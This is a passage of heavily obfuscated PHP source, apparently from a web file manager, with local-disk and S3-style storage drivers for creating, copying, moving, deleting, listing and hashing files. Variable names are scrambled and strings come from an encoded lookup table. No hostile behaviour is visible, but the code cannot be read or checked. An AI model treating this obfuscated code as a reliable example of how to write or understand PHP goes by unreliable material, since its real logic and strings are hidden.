Model($¼é†µñØ[544])->linkAdd($¡éûÙ¿[$¼é†µñØ[629]]); Model($¼é†µñØ[544])->remove($¡éûÙ¿[$¼é†µñØ[667]]); $this->folderSizeReset($ìÍ×ïú›); $this->updateModifyTime($ìÍ×ïú›); return $ÀŠøºà¾; } private function _copyChildTo($æúı‡ßÑ, $ç‚«Ú…, $ÆÑÂ©í¸, $Ç­Áæíá, &$Äìœ‘–Ø, $ŸÀ«„™€) { $ÆˆÃ¥¬¬ =& $_SERVER[¦»×‡Ãã]; $ğÎ¨¤Èê = $this->sourceInfoCache($ÆÑÂ©í¸); $Î’‘Á = $æúı‡ßÑ->listPath($ç‚«Ú…); $Î’‘Á = $Î’‘Á ? $Î’‘Á : array($ÆˆÃ¥¬¬[86] => array(), $ÆˆÃ¥¬¬[85] => array()); $ØåšË¶Ä = array_merge($Î’‘Á[$ÆˆÃ¥¬¬[86]], $Î’‘Á[$ÆˆÃ¥¬¬[85]]); $üê¬¯¸œ = $this->_addFiles($æúı‡ßÑ, $Î’‘Á[$ÆˆÃ¥¬¬[86]], $ŸÀ«„™€); $øº«â‚× = array(); foreach ($ØåšË¶Ä as &$ñˆ°ÒÁ) { if (isset($üê¬¯¸œ[$ñˆ°ÒÁ[$ÆˆÃ¥¬¬[32]]])) { $ñˆ°ÒÁ = $üê¬¯¸œ[$ñˆ°ÒÁ[$ÆˆÃ¥¬¬[32]]]; } $ñˆ°ÒÁ[$ÆˆÃ¥¬¬[485]] = $ñˆ°ÒÁ[$ÆˆÃ¥¬¬[33]] == $ÆˆÃ¥¬¬[78]; $ñˆ°ÒÁ[$ÆˆÃ¥¬¬[486]] = substr(_get($ñˆ°ÒÁ, $ÆˆÃ¥¬¬[169], $ÆˆÃ¥¬¬[12]), 0, 10); $ñˆ°ÒÁ[$ÆˆÃ¥¬¬[79]] = _get($ñˆ°ÒÁ, $ÆˆÃ¥¬¬[79], 0); $ñˆ°ÒÁ[$ÆˆÃ¥¬¬[541]] = _get($ñˆ°ÒÁ, $ÆˆÃ¥¬¬[541], 0); if (!isset($ñˆ°ÒÁ[$ÆˆÃ¥¬¬[670]]) && $ñˆ°ÒÁ[$ÆˆÃ¥¬¬[541]]) { $Äìœ‘–Ø[$ÆˆÃ¥¬¬[667]][] = $ñˆ°ÒÁ[$ÆˆÃ¥¬¬[541]]; } if ($Ç­Áæíá) { $ıĞÎääò = $this->fileNameExistCache($ÆÑÂ©í¸, $ñˆ°ÒÁ[$ÆˆÃ¥¬¬[32]]); if ($ıĞÎääò) { if ($ñˆ°ÒÁ[$ÆˆÃ¥¬¬[485]] || $Ç­Áæíá == REPEAT_SKIP) { continue; } if ($Ç­Áæíá == REPEAT_REPLACE) { $»•êãÃ = $this->sourceInfoCache($ıĞÎääò); $ÜÏÎñãø = $this->fileHistory($»•êãÃ, $ñˆ°ÒÁ[$ÆˆÃ¥¬¬[541]], $ñˆ°ÒÁ[$ÆˆÃ¥¬¬[79]]); if ($ÜÏÎñãø) { $Äìœ‘–Ø[$ÆˆÃ¥¬¬[629]][] = $ñˆ°ÒÁ[$ÆˆÃ¥¬¬[541]]; } continue; } else { if ($Ç­Áæíá == REPEAT_RENAME) { $ñˆ°ÒÁ[$ÆˆÃ¥¬¬[32]] = $this->fileNameAutoCache($ÆÑÂ©í¸, $ñˆ°ÒÁ[$ÆˆÃ¥¬¬[32]], $Ç­Áæíá, !1); } } } } if (!$ñˆ°ÒÁ[$ÆˆÃ¥¬¬[485]] && $ñˆ°ÒÁ[$ÆˆÃ¥¬¬[541]] == 0) { continue; } if (!$ñˆ°ÒÁ[$ÆˆÃ¥¬¬[485]] && $ñˆ°ÒÁ[$ÆˆÃ¥¬¬[541]]) { $Äìœ‘–Ø[$ÆˆÃ¥¬¬[629]][] = $ñˆ°ÒÁ[$ÆˆÃ¥¬¬[541]]; } $øº«â‚×[] = $this->_makeItemData($ñˆ°ÒÁ, $ğÎ¨¤Èê, $ñˆ°ÒÁ[$ÆˆÃ¥¬¬[32]]); } unset($ñˆ°ÒÁ); if (!empty($øº«â‚×)) { $this->addAll($øº«â‚×); $this->_childrenListSelect($ÆÑÂ©í¸); } $Ïù‹ê¯Ø = $this->_childrenList($ÆÑÂ©í¸); $Ïù‹ê¯Ø = array_to_keyvalue($Ïù‹ê¯Ø, $ÆˆÃ¥¬¬[32]); foreach ($ØåšË¶Ä as $ñˆ°ÒÁ) { $»•êãÃ = $Ïù‹ê¯Ø[$ñˆ°ÒÁ[$ÆˆÃ¥¬¬[32]]]; $€à“ÂØ‘ = $»•êãÃ[$ÆˆÃ¥¬¬[193]]; $this->_copyApplyMeta($»•êãÃ, $Äìœ‘–Ø); if ($ñˆ°ÒÁ[$ÆˆÃ¥¬¬[33]] == $ÆˆÃ¥¬¬[78]) { $ñˆ°ÒÁ[$ÆˆÃ¥¬¬[87]] = $æúı‡ßÑ->getPathInner($ñˆ°ÒÁ[$ÆˆÃ¥¬¬[87]]); $this->_copyChildTo($æúı‡ßÑ, $ñˆ°ÒÁ[$ÆˆÃ¥¬¬[87]], $€à“ÂØ‘, $Ç­Áæíá, $Äìœ‘–Ø, $ŸÀ«„™€); } } } private function _addFiles($é©´º¢, $êŠóüí, $€˜ˆôÚ) { $ÛÕ­å‹ç =& $_SERVER[¦»×‡Ãã]; if (!$êŠóüí || count($êŠóüí) == 0) { return array(); } $˜Î¡æ± = array(); foreach ($êŠóüí as &$®’Ğì«Å) { Hook::trigger($ÛÕ­å‹ç[671], $®’Ğì«Å); $®’Ğì«Å[$ÛÕ­å‹ç[87]] = $é©´º¢->getPathInner($®’Ğì«Å[$ÛÕ­å‹ç[87]]); $…Ò¨˜·« = $é©´º¢->hashSimple($®’Ğì«Å[$ÛÕ­å‹ç[87]]); $ªì·Ñ«Á = $é©´º¢->hashMd5($®’Ğì«Å[$ÛÕ­å‹ç[87]]); if (strlen($ªì·Ñ«Á) > 10 && !isset($˜Î¡æ±[$ªì·Ñ«Á])) { $˜Î¡æ±[$ªì·Ñ«Á] = array(); } $®’Ğì«Å[$ÛÕ­å‹ç[672]] = $…Ò¨˜·«; $®’Ğì«Å[$ÛÕ­å‹ç[547]] = $ªì·Ñ«Á; $˜Î¡æ±[$ªì·Ñ«Á][] =& $®’Ğì«Å; if (count($˜Î¡æ±[$ªì·Ñ«Á]) > 1) { $®’Ğì«Å[$ÛÕ­å‹ç[670]] = !0; } Hook::trigger($ÛÕ­å‹ç[673], $®’Ğì«Å); } unset($®’Ğì«Å); $µ²›ã… = array($ÛÕ­å‹ç[547] => array($ÛÕ­å‹ç[7], array_keys($˜Î¡æ±))); $õÍ¿¬–Ñ = Model($ÛÕ­å‹ç[674]); $äèŒºİÃ = $õÍ¿¬–Ñ->where($µ²›ã…)->select(); $äèŒºİÃ = $äèŒºİÃ ? $äèŒºİÃ : array(); foreach ($äèŒºİÃ as $Îşòë¼Û) { if (!isset($˜Î¡æ±[$Îşòë¼Û[$ÛÕ­å‹ç[547]]])) { continue; } $ª×Êé—í = $˜Î¡æ±[$Îşòë¼Û[$ÛÕ­å‹ç[547]]]; foreach ($ª×Êé—í as &$®’Ğì«Å) { $®’Ğì«Å[$ÛÕ­å‹ç[541]] = $Îşòë¼Û[$ÛÕ­å‹ç[541]]; $®’Ğì«Å[$ÛÕ­å‹ç[670]] = !0; } unset($®’Ğì«Å); } $Í›°â‚¬ = array(); foreach ($êŠóüí as $Ü”î»¾Á) { Hook::trigger($ÛÕ­å‹ç[675], $Ü”î»¾Á); if (isset($Ü”î»¾Á[$ÛÕ­å‹ç[670]]) && $Ü”î»¾Á[$ÛÕ­å‹ç[670]]) { Hook::trigger($ÛÕ­å‹ç[676], $Ü”î»¾Á); continue; } $ü“ˆ†ëØ = $é©´º¢->getPathInner($Ü”î»¾Á[$ÛÕ­å‹ç[87]]); $öŒäÄ‰Š = $õÍ¿¬–Ñ->addFileMake($ü“ˆ†ëØ, $Ü”î»¾Á[$ÛÕ­å‹ç[79]], $Ü”î»¾Á[$ÛÕ­å‹ç[672]], $Ü”î»¾Á[$ÛÕ­å‹ç[547]], $Ü”î»¾Á[$ÛÕ­å‹ç[32]], $€˜ˆôÚ); Hook::trigger($ÛÕ­å‹ç[676], $Ü”î»¾Á); if (!is_array($öŒäÄ‰Š)) { continue; } $Í›°â‚¬[] = $öŒäÄ‰Š; } $õÍ¿¬–Ñ->addAll($Í›°â‚¬); $µ²›ã… = array($ÛÕ­å‹ç[547] => array($ÛÕ­å‹ç[7], array_keys($˜Î¡æ±))); $äèŒºİÃ = $õÍ¿¬–Ñ->where($µ²›ã…)->select(); $äèŒºİÃ = $äèŒºİÃ ? $äèŒºİÃ : array(); foreach ($äèŒºİÃ as $Îşòë¼Û) { if (!isset($˜Î¡æ±[$Îşòë¼Û[$ÛÕ­å‹ç[547]]])) { continue; } $õŞû›‚ =& $˜Î¡æ±[$Îşòë¼Û[$ÛÕ­å‹ç[547]]]; foreach ($õŞû›‚ as &$®’Ğì«Å) { $®’Ğì«Å[$ÛÕ­å‹ç[541]] = $Îşòë¼Û[$ÛÕ­å‹ç[541]]; } unset($®’Ğì«Å); } $€„•ÜÚ³ = array(); foreach ($êŠóüí as $øáõ”£Í) { $€„•ÜÚ³[$øáõ”£Í[$ÛÕ­å‹ç[32]]] = $øáõ”£Í; } return $€„•ÜÚ³; } } define($_SERVER[¦»×‡Ãã][677], $_SERVER[¦»×‡Ãã][678]); $whpnbvsefg = $_SERVER[¦»×‡Ãã][679]; goto bàäğëàŠÊ; C˜ÇÁƒšø: define($_SERVER[¦»×‡Ãã][317], 3); define($_SERVER[¦»×‡Ãã][318], 1); define($_SERVER[¦»×‡Ãã][319], 0); goto bÇµ¿¹ÕÚÒ; B‹¯É²Ïï–: class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($íá‘“”–) { if (substr($íá‘“”–, 0, 2) == $_SERVER[¦»×‡Ãã][1410]) { $íá‘“”– = BASIC_PATH . substr($íá‘“”–, 2); } return $íá‘“”–; } public function iconvApp($„Ú¡ë°¤) { $á’ˆõÅ… =& $_SERVER[¦»×‡Ãã]; global $config; return $this->iconvTo($„Ú¡ë°¤, $config[$á’ˆõÅ…[1439]], $config[$á’ˆõÅ…[1438]]); } public function iconvSystem($Åşì‘’) { $Ó“á˜øĞ =& $_SERVER[¦»×‡Ãã]; global $config; return $this->iconvTo($Åşì‘’, $config[$Ó“á˜øĞ[1438]], $config[$Ó“á˜øĞ[1439]]); } public function getPathOuter($Íëëáæ) { $ıª‹ôÆü =& $_SERVER[¦»×‡Ãã]; $ùË„”²ş = $this->iconvApp($this->pathBase); $Íëëáæ = $this->iconvApp($Íëëáæ); if (substr($ùË„”²ş, 0, 2) == $ıª‹ôÆü[1410]) { $ùË„”²ş = BASIC_PATH . substr($ùË„”²ş, 2); } if (substr($Íëëáæ, 0, 2) == $ıª‹ôÆü[1410]) { $Íëëáæ = BASIC_PATH . substr($Íëëáæ, 2); } $ùË„”²ş = KodIO::clear($ùË„”²ş); $Íëëáæ = KodIO::clear($Íëëáæ); $Íëëáæ = substr($Íëëáæ, strlen($ùË„”²ş)); if (empty($this->pathDriver)) { return $Íëëáæ; } return $this->pathDriver . $ıª‹ôÆü[8] . ltrim($Íëëáæ, $ıª‹ôÆü[8]); } public function mkfile($óóË—É¼, $¥”şœä = '', $²¬Íù” = REPEAT_RENAME) { $óóË—É¼ = $this->iconvSystem($óóË—É¼); @touch($óóË—É¼); if ($¥”şœä) { file_put_contents($óóË—É¼, $¥”şœä); } @chmod($óóË—É¼, $this->pathAuth); if (is_file($óóË—É¼)) { return $this->getPathOuter($óóË—É¼); } $this->writeLog(__FUNCTION__ . $_SERVER[¦»×‡Ãã][1450], !0); return !1; } public function mkdir($¹©ïæ¹È, $ÅîÚÈ‹ü = REPEAT_SKIP) { $¹©ïæ¹È = $this->iconvSystem($¹©ïæ¹È); if (is_dir($¹©ïæ¹È)) { return $this->getPathOuter($¹©ïæ¹È); } @mkdir($¹©ïæ¹È, $this->pathAuth, !0); @chmod($¹©ïæ¹È, $this->pathAuth); if (is_dir($¹©ïæ¹È)) { return $this->getPathOuter($¹©ïæ¹È); } $this->writeLog(__FUNCTION__ . $_SERVER[¦»×‡Ãã][1450], !0); return !1; } public function copyFile($‹¦İüØÓ, $²õá¹¼¬) { $this->mkdir($this->pathFather($²õá¹¼¬)); $‹¦İüØÓ = $this->iconvSystem($‹¦İüØÓ); $²õá¹¼¬ = $this->iconvSystem($²õá¹¼¬); $ùß ˜ ³ = copy_64($‹¦İüØÓ, $²õá¹¼¬); @chmod($²õá¹¼¬, $this->pathAuth); if ($ùß ˜ ³) { return $this->getPathOuter($²õá¹¼¬); } $this->writeLog(__FUNCTION__ . $_SERVER[¦»×‡Ãã][1450], !0); return !1; } public function moveFile($§ú›¡¤º, $„“²»ş‘) { $this->mkdir($this->pathFather($„“²»ş‘)); $§ú›¡¤º = $this->iconvSystem($§ú›¡¤º); $„“²»ş‘ = $this->iconvSystem($„“²»ş‘); $ÇÌèÍ³ = intval(@rename($§ú›¡¤º, $„“²»ş‘)); if (!$ÇÌèÍ³) { if ($ÇÌèÍ³ = intval(@copy_64($§ú›¡¤º, $„“²»ş‘))) { @unlink($§ú›¡¤º); } } @chmod($„“²»ş‘, $this->pathAuth); if ($ÇÌèÍ³) { return $this->getPathOuter($„“²»ş‘); } $this->writeLog(__FUNCTION__ . $_SERVER[¦»×‡Ãã][1450], !0); return !1; } public function movePath($„Ïº¬†¦, $ª„Õ£°, $š¸‚ê£€ = false) { $½Í»•Ç• =& $_SERVER[¦»×‡Ãã]; $„Ïº¬†¦ = $this->iconvSystem($„Ïº¬†¦); $ª„Õ£° = $this->iconvSystem($ª„Õ£°); $ÂŸªìø = rtrim($ª„Õ£°, $½Í»•Ç•[8]) . $½Í»•Ç•[8] . ($š¸‚ê£€ ? $š¸‚ê£€ : get_path_this($„Ïº¬†¦)); if (file_exists($ÂŸªìø)) { return !1; } $Î¨­ÈÔĞ = intval(@rename($„Ïº¬†¦, $ÂŸªìø)); $Î¨­ÈÔĞ = file_exists($ÂŸªìø); if ($Î¨­ÈÔĞ) { return $this->getPathOuter($ÂŸªìø); } $this->writeLog(__FUNCTION__ . $½Í»•Ç•[1450], !0); return !1; } public function delFile($Œš¬òÙŸ) { $Œš¬òÙŸ = $this->iconvSystem($Œš¬òÙŸ); if (!@unlink($Œš¬òÙŸ)) { @chmod($Œš¬òÙŸ, $this->pathAuth); if (@unlink($Œš¬òÙŸ)) { return !0; } $this->writeLog(__FUNCTION__ . $_SERVER[¦»×‡Ãã][1450], !0); return !1; } return !0; } public function delFolder($‚ßÒş’ï) { $£Œ´½ú¿ =& $_SERVER[¦»×‡Ãã]; $‚ßÒş’ï = $this->iconvSystem($‚ßÒş’ï); if (!is_dir($‚ßÒş’ï)) { return !0; } if (!($¦Ä›Ú = opendir($‚ßÒş’ï))) { return !1; } while (($ÛÑƒİ¢ƒ = readdir($¦Ä›Ú)) !== !1) { if ($ÛÑƒİ¢ƒ == $£Œ´½ú¿[10] || $ÛÑƒİ¢ƒ == $£Œ´½ú¿[1363]) { continue; } $ö‰Š°ôÙ = $‚ßÒş’ï . $£Œ´½ú¿[8] . $ÛÑƒİ¢ƒ; if (is_file($ö‰Š°ôÙ) || is_link($ö‰Š°ôÙ)) { if (!unlink($ö‰Š°ôÙ)) { chmod($ö‰Š°ôÙ, $this->pathAuth); if (!unlink($ö‰Š°ôÙ)) { return !1; } } } else { if (is_dir($ö‰Š°ôÙ)) { chmod($ö‰Š°ôÙ, $this->pathAuth); $ö‰Š°ôÙ = $this->iconvApp($ö‰Š°ôÙ); if (!$this->delFolder($ö‰Š°ôÙ)) { return !1; } } } } closedir($¦Ä›Ú); return rmdir($‚ßÒş’ï); } public function rename($„½ÁªÎÈ, $·¹– …·) { $ªà¿¢ü¾ =& $_SERVER[¦»×‡Ãã]; $ÚÆ»€¾” = $this->fileNameAuto($this->pathFather($„½ÁªÎÈ), $·¹– …·); $ÚÆ»€¾” = $this->iconvSystem($ÚÆ»€¾”); $„½ÁªÎÈ = $this->iconvSystem($„½ÁªÎÈ); $ÖÕ½È‹ = $this->pathFather($„½ÁªÎÈ); $ŸÊ©É³± = rtrim($ÖÕ½È‹, $ªà¿¢ü¾[8]) . $ªà¿¢ü¾[8] . $ÚÆ»€¾”; $‘»Ûüò· = @rename($„½ÁªÎÈ, $ŸÊ©É³±); $ŸÊ©É³± = $this->iconvApp($ŸÊ©É³±); if ($‘»Ûüò·) { return $this->getPathOuter($ŸÊ©É³±); } $this->writeLog(__FUNCTION__ . $ªà¿¢ü¾[1450], !0); return !1; } public function size($‰Á¹ªü) { $‰Á¹ªü = $this->iconvSystem($‰Á¹ªü); return filesize_64($‰Á¹ªü); } public function info($ ¹¯‹Èü) { $ ¹¯‹Èü = $this->iconvSystem($ ¹¯‹Èü); if ($this->isFolder($ ¹¯‹Èü)) { return $this->folderInfo($ ¹¯‹Èü); } else { if ($this->isFile($ ¹¯‹Èü)) { return $this->fileInfo($ ¹¯‹Èü); } } return !1; } protected function infoChildren($¡ì³·ñ, &$ÔÍ¾òîŸ, $ğ¨€º÷Ø = true) { $Ô‰Œó–Õ =& $_SERVER[¦»×‡Ãã]; check_abort_echo(); $¡ì³·ñ = rtrim($¡ì³·ñ, $Ô‰Œó–Õ[8]) . $Ô‰Œó–Õ[8]; if ($ğ¨€º÷Ø) { $¡ì³·ñ = $this->iconvSystem($¡ì³·ñ); } if (!($ş Ì¹€™ = @opendir($¡ì³·ñ))) { return; } while (($ÏÊ„º = readdir($ş Ì¹€™)) !== !1) { if ($ÏÊ„º == $Ô‰Œó–Õ[10] || $ÏÊ„º == $Ô‰Œó–Õ[1363]) { continue; } $›éÃı´– = $¡ì³·ñ . $ÏÊ„º; if (is_file($›éÃı´–) || is_link($›éÃı´–)) { $ÔÍ¾òîŸ[$Ô‰Œó–Õ[80]]++; $ÔÍ¾òîŸ[$Ô‰Œó–Õ[79]] += filesize_64($›éÃı´–); } else { if (is_dir($›éÃı´–)) { $ÔÍ¾òîŸ[$Ô‰Œó–Õ[81]]++; $this->infoChildren($›éÃı´–, $ÔÍ¾òîŸ, !1); } } } closedir($ş Ì¹€™); } private function folderInfo($ÚËæÂ‚ğ, $³¢³¦Õˆ = false) { $ùîªöÁ =& $_SERVER[¦»×‡Ãã]; $ÚËæÂ‚ğ = rtrim($ÚËæÂ‚ğ, $ùîªöÁ[8]) . $ùîªöÁ[8]; $»ğã–Û“ = $this->iconvApp($this->pathThis($ÚËæÂ‚ğ)); if ($³¢³¦Õˆ) { return array($ùîªöÁ[32] => $»ğã–Û“, $ùîªöÁ[87] => $this->getPathOuter($ÚËæÂ‚ğ), $ùîªöÁ[33] => $ùîªöÁ[78]); } $ıÎóşïş = array($ùîªöÁ[32] => $»ğã–Û“, $ùîªöÁ[87] => $this->getPathOuter($ÚËæÂ‚ğ), $ùîªöÁ[33] => $ùîªöÁ[78], $ùîªöÁ[231] => @filectime($ÚËæÂ‚ğ), $ùîªöÁ[88] => @filemtime($ÚËæÂ‚ğ), $ùîªöÁ[1454] => @fileatime($ÚËæÂ‚ğ), $ùîªöÁ[1455] => is_readable($ÚËæÂ‚ğ), $ùîªöÁ[1456] => is_writable($ÚËæÂ‚ğ), $ùîªöÁ[1457] => get_mode($ÚËæÂ‚ğ)); return $ıÎóşïş; } private function fileInfo($­İ‰îÄ, $©¡ùÍÛ = false) { $Š›øÖşş =& $_SERVER[¦»×‡Ãã]; $ƒ–²¥Ì = $this->iconvApp($this->pathThis($­İ‰îÄ)); if ($©¡ùÍÛ) { return array($Š›øÖşş[32] => $ƒ–²¥Ì, $Š›øÖşş[87] => $this->getPathOuter($­İ‰îÄ), $Š›øÖşş[33] => $Š›øÖşş[230], $Š›øÖşş[79] => $this->size($­İ‰îÄ), $Š›øÖşş[169] => $this->ext($ƒ–²¥Ì)); } $§ÅâÏ¦ = array($Š›øÖşş[32] => $ƒ–²¥Ì, $Š›øÖşş[87] => $this->getPathOuter($­İ‰îÄ), $Š›øÖşş[33] => $Š›øÖşş[230], $Š›øÖşş[231] => @filectime($­İ‰îÄ), $Š›øÖşş[88] => @filemtime($­İ‰îÄ), $Š›øÖşş[1454] => @fileatime($­İ‰îÄ), $Š›øÖşş[79] => $this->size($­İ‰îÄ), $Š›øÖşş[169] => $this->ext($ƒ–²¥Ì), $Š›øÖşş[1455] => is_readable($­İ‰îÄ), $Š›øÖşş[1456] => is_writable($­İ‰îÄ), $Š›øÖşş[1457] => get_mode($­İ‰îÄ)); return $§ÅâÏ¦; } public function exist($Ñ£°–ùì) { $Ñ£°–ùì = $this->iconvSystem($Ñ£°–ùì); return @file_exists($Ñ£°–ùì); } public function isFile($Ó¯Ç¼ı†) { $Ó¯Ç¼ı† = $this->iconvSystem($Ó¯Ç¼ı†); return @is_file($Ó¯Ç¼ı†); } public function isFolder($ÏœôèÀ½) { $ÏœôèÀ½ = $this->iconvSystem($ÏœôèÀ½); return @is_dir($ÏœôèÀ½); } public function listPath($¾ù—Ë¡Ë, $ÇëÒ„£ = false) { $£¬Ã°í™ =& $_SERVER[¦»×‡Ãã]; $¾ù—Ë¡Ë = $this->iconvSystem($¾ù—Ë¡Ë); $¾ù—Ë¡Ë = rtrim($¾ù—Ë¡Ë, $£¬Ã°í™[8]) . $£¬Ã°í™[8]; $ÆÎƒÃ©² = array($£¬Ã°í™[85] => array(), $£¬Ã°í™[86] => array()); if (!($È»Şà…Ã = @opendir($¾ù—Ë¡Ë))) { return $ÆÎƒÃ©²; } while (($ÅËÛ·„ = readdir($È»Şà…Ã)) !== !1) { if ($ÅËÛ·„ == $£¬Ã°í™[10] || $ÅËÛ·„ == $£¬Ã°í™[1363]) { continue; } $€§áÌ¦ª = $¾ù—Ë¡Ë . $ÅËÛ·„; if (is_file($€§áÌ¦ª)) { $ÆÎƒÃ©²[$£¬Ã°í™[86]][] = $this->fileInfo($€§áÌ¦ª, $ÇëÒ„£); } else { $ÆÎƒÃ©²[$£¬Ã°í™[85]][] = $this->folderInfo($€§áÌ¦ª, $ÇëÒ„£); } } closedir($È»Şà…Ã); return $ÆÎƒÃ©²; } public function listAll($§Œ÷†ğƒ, &$Æñ‰Şï = array()) { $ışŠı­ç =& $_SERVER[¦»×‡Ãã]; $§Œ÷†ğƒ = $this->iconvSystem($§Œ÷†ğƒ); $§Œ÷†ğƒ = rtrim($§Œ÷†ğƒ, $ışŠı­ç[8]) . $ışŠı­ç[8]; if (!($‰éùÊúÊ = @opendir($§Œ÷†ğƒ))) { return $Æñ‰Şï; } while (($°Ü¨«ş© = readdir($‰éùÊúÊ)) !== !1) { if ($°Ü¨«ş© == $ışŠı­ç[10] || $°Ü¨«ş© == $ışŠı­ç[1363]) { continue; } $š´×ŸÅƒ = $§Œ÷†ğƒ . $°Ü¨«ş©; $óê½ô¬Í = is_dir($š´×ŸÅƒ) && !is_link($š´×ŸÅƒ) ? 1 : 0; $š´×ŸÅƒ = $óê½ô¬Í ? $š´×ŸÅƒ . $ışŠı­ç[8] : $š´×ŸÅƒ; $Æñ‰Şï[] = array($ışŠı­ç[87] => $š´×ŸÅƒ, $ışŠı­ç[78] => $óê½ô¬Í, $ışŠı­ç[88] => intval(@filemtime($š´×ŸÅƒ)), $ışŠı­ç[79] => $óê½ô¬Í ? 0 : intval($this->size($š´×ŸÅƒ))); if ($óê½ô¬Í) { $this->listAll($š´×ŸÅƒ, $Æñ‰Şï); } } closedir($‰éùÊúÊ); return $Æñ‰Şï; } public function has($ŸÙÏ‚•Ó, $‹ÂŒ¢úˆ = false, $‚ºÀû´è = true) { $³°ÈÓ©— =& $_SERVER[¦»×‡Ãã]; $ŸÙÏ‚•Ó = $this->iconvSystem($ŸÙÏ‚•Ó); $ŸÙÏ‚•Ó = rtrim($ŸÙÏ‚•Ó, $³°ÈÓ©—[8]) . $³°ÈÓ©—[8]; if (!($ºÉşê¯› = @opendir($ŸÙÏ‚•Ó))) { return !1; } $×§·ãÃË = 0; $Û®Ôêª— = 0; $¼ÂÛ¾Œ = 0; while (($ÈŠÖ‘ŒÁ = readdir($ºÉşê¯›)) !== !1) { if ($ÈŠÖ‘ŒÁ == $³°ÈÓ©—[10] || $ÈŠÖ‘ŒÁ == $³°ÈÓ©—[1363]) { continue; } $¾¦ÉİŸŠ = $ŸÙÏ‚•Ó . $ÈŠÖ‘ŒÁ; if ($‹ÂŒ¢úˆ) { $¼ÂÛ¾Œ++; if (@is_file($¾¦ÉİŸŠ)) { $×§·ãÃË++; } else { $Û®Ôêª—++; } if ($¼ÂÛ¾Œ > 10000) { break; } continue; } if ($‚ºÀû´è) { if (@is_file($¾¦ÉİŸŠ)) { return !0; } } else { if (@is_dir($¾¦ÉİŸŠ . $³°ÈÓ©—[8])) { return !0; } } } closedir($ºÉşê¯›); if ($‹ÂŒ¢úˆ) { return array($³°ÈÓ©—[239] => $×§·ãÃË, $³°ÈÓ©—[240] => $Û®Ôêª—); } return !1; } public function hashSimple($›ß‡¤ÛÛ) { $¶â¨Á­„ =& $_SERVER[¦»×‡Ãã]; if (!$›ß‡¤ÛÛ) { return md5($¶â¨Á­„[12]); } $›ß‡¤ÛÛ = $this->iconvSystem($›ß‡¤ÛÛ); $ã”¼ı§ü = $this->size($›ß‡¤ÛÛ); $Â¸Úœ±× = 200; $üÍ……¥ó = 50; if ($ã”¼ı§ü <= $Â¸Úœ±× * $üÍ……¥ó) { return $this->hashMd5($›ß‡¤ÛÛ) . $ã”¼ı§ü; } $ğ§¿›ª = $¶â¨Á­„[12]; $ó¢Ù·Œ‚ = intval($ã”¼ı§ü / $üÍ……¥ó); $õôä–ºå = fopen($›ß‡¤ÛÛ, $¶â¨Á­„[1458]); if (!$õôä–ºå) { return $ğ§¿›ª; } for ($×¨Ú¬óÆ = 0; $×¨Ú¬óÆ < $üÍ……¥ó; $×¨Ú¬óÆ++) { fseek_64($õôä–ºå, $ó¢Ù·Œ‚ * $×¨Ú¬óÆ); $ğ§¿›ª .= fread($õôä–ºå, $Â¸Úœ±×); } fseek_64($õôä–ºå, $ã”¼ı§ü - $Â¸Úœ±×); $ğ§¿›ª .= fread($õôä–ºå, $Â¸Úœ±×); fclose($õôä–ºå); return md5($ğ§¿›ª) . $ã”¼ı§ü; } public function getContent($¹±ßÇëë) { $¹±ßÇëë = $this->iconvSystem($¹±ßÇëë); return file_get_contents($¹±ßÇëë); } public function setContent($öÓ“ùÈ”, $µü±ê = '') { $öÓ“ùÈ” = $this->iconvSystem($öÓ“ùÈ”); $Šƒò ¸ = @file_put_contents($öÓ“ùÈ”, $µü±ê, LOCK_EX); if (!$Šƒò ¸) { $this->writeLog(__FUNCTION__ . $_SERVER[¦»×‡Ãã][1450], !0); } clearstatcache(); @chmod($öÓ“ùÈ”, $this->pathAuth); return $Šƒò ¸ === !1 ? !1 : !0; } public function fileSubstr($øÄ±æ—É, $¢Àà¸¸ü = 0, $²¡¿•ØÉ = false) { $Øá£ˆ¬ =& $_SERVER[¦»×‡Ãã]; $øÄ±æ—É = $this->iconvSystem($øÄ±æ—É); if ($²¡¿•ØÉ === !1) { $²¡¿•ØÉ = $this->size($øÄ±æ—É); } if ($²¡¿•ØÉ <= 0) { return $Øá£ˆ¬[12]; } $´Ì¾‡É = fopen($øÄ±æ—É, $Øá£ˆ¬[1458]); if (!$´Ì¾‡É) { return !1; } fseek_64($´Ì¾‡É, $¢Àà¸¸ü); $ïĞÚÕ¨„ = fread($´Ì¾‡É, $²¡¿•ØÉ); fclose($´Ì¾‡É); if (!$ïĞÚÕ¨„) { $this->writeLog(__FUNCTION__ . $Øá£ˆ¬[1450], !0); } return $ïĞÚÕ¨„; } public function upload($”ÑóÚ¤¸, $¿ó–‚óø, $““™À = false, $†Çáç¶™ = REPEAT_REPLACE) { if ($““™À) { return $this->moveFile($¿ó–‚óø, $”ÑóÚ¤¸); } return $this->copyFile($¿ó–‚óø, $”ÑóÚ¤¸); } public function setModifyTime($ÆØçëø, $•€á³¾ = '') { @touch($ÆØçëø, intval($•€á³¾)); } public function download($¤ìì¬Æ¤, $ş¢µ Ü) { return $this->iconvSystem($¤ìì¬Æ¤); } } class PathDriverOBS extends PathDriverBaseS3 { public function __construct($¿êåÕ ) { parent::__construct($¿êåÕ ); $this->setSignVersion($_SERVER[¦»×‡Ãã][247]); } public function fileOutImage($«Ü Ùëò, $‡Ë…¤ìÅ = 250) { $¼ÛÎƒƒ =& $_SERVER[¦»×‡Ãã]; if ($this->size($«Ü Ùëò) > 1024 * 1024 * 25) { return $this->fileOutImageServer($«Ü Ùëò, $‡Ë…¤ìÅ); } $Ø´œÂä = array($¼ÛÎƒƒ[1459] => $¼ÛÎƒƒ[1460] . $‡Ë…¤ìÅ . $¼ÛÎƒƒ[1461]); $Ïêğàô˜ = $this->link($«Ü Ùëò, $Ø´œÂä); $this->fileOutLink($Ïêğàô˜); } public function fileOutLink($ÚÛâƒø) { $Ã©§Å„ =& $_SERVER[¦»×‡Ãã]; if (substr($ÚÛâƒø, 0, 7) == $Ã©§Å„[313]) { $ÚÛâƒø = $Ã©§Å„[314] . substr($ÚÛâƒø, 7); } header($Ã©§Å„[175] . $ÚÛâƒø); die; } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($Ó€ë£‰) { parent::__construct($Ó€ë£‰); $this->setSignVersion($_SERVER[¦»×‡Ãã][247]); } public function fileOutLink($íÏ¸ƒ¡ı) { $ÏÅÉš„é =& $_SERVER[¦»×‡Ãã]; if (substr($íÏ¸ƒ¡ı, 0, 7) == $ÏÅÉš„é[313]) { $íÏ¸ƒ¡ı = 